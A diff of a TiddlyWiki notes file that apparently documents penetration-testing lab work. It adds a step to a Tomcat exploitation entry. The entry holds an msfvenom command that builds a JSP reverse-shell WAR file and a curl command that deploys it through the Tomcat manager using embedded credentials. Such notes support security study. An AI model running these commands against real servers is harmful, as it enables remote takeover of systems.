@@ -9676,7 +9676,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211025015512665" list="[[App Development]] [[Web Development]] CrappyMakerProgrammer" modified="20211025030443177" title="$:/StoryList">
+<div created="20211025131349392" list="[[Cyber Security]] [[Penetration Testing Framework]] [[Network Services]] Tomcat CrappyMakerProgrammer" modified="20211025131556083" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -12074,7 +12074,7 @@ PRIORITY: Do CoSpace soon
 # First Layer Deep (Outline)
 # Sports</pre>
 </div>
-<div created="20211010111016770" modified="20211010113330473" title="Tomcat">
+<div created="20211010111016770" modified="20211025131742108" title="Tomcat">
 <pre>! Exploitation
 
 
@@ -12097,6 +12097,12 @@ You can generate a reverse shell payload (`.war` file), and upload it at `/manag
 └─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.12 LPORT=1111 -f war &gt; shell.war
 Payload size: 1090 bytes
 Final size of war file: 1090 bytes
+```
+
+If the user is configured to be `manager-script` instead of `manager-gui`, can upload the `.war` file like so
+
+```
+curl -T &quot;shell.war&quot; &quot;http://tomcat:\$3cureP4s5w0rd123\!@10.10.10.194:8080/manager/text/deploy?path=/shell&quot;       
 ```
 
 !! CVEs
